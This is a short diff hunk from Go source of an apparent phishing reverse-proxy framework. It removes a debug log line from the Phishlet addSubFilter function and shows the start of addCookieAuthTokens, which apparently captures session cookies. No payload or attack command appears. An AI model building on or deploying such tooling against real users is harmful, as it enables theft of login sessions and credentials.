@@ -970,7 +970,6 @@ func (p *Phishlet) addSubFilter(hostname string, subdomain string, domain string
 		mime[n] = strings.ToLower(mime[n])
 	}
 	p.subfilters[hostname] = append(p.subfilters[hostname], SubFilter{subdomain: subdomain, domain: domain, mime: mime, regexp: regexp, replace: replace, redirect_only: redirect_only, with_params: with_params})
-	log.Debug("[fedleak-load] phishlet=%s addSubFilter triggers_on=%q orig_sub=%q domain=%q search=%q now_count_for_key=%d", p.Name, hostname, subdomain, domain, regexp, len(p.subfilters[hostname]))
 }
 
 func (p *Phishlet) addCookieAuthTokens(hostname string, tokens []string) error {
